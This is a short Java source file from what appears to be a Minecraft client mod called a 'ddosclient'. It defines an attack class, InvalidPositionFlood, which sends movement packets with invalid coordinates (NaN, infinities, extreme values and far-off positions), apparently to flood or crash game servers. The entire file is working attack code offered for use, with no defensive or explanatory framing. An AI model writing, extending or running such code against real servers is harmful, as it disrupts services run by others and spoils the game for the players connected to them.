package com.ddosclient.attack.attacks;

import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

public class InvalidPositionFlood extends BaseAttack {
    private final double[] invalidY = {
        Double.MAX_VALUE, Double.MIN_VALUE, Double.NaN,
        Double.POSITIVE_INFINITY, Double.NEGATIVE_INFINITY,
        99999999.0, -99999999.0, 0.0
    };
    private int idx = 0;

    @Override
    public void execute(MinecraftClient mc) {
        if (mc.getNetworkHandler() == null || mc.player == null) return;
        double x = mc.player.getX();
        double z = mc.player.getZ();
        double y = invalidY[idx % invalidY.length];
        idx++;
        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(x, y, z, false));
        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
            x + 999999, y, z + 999999, false
        ));
    }
}
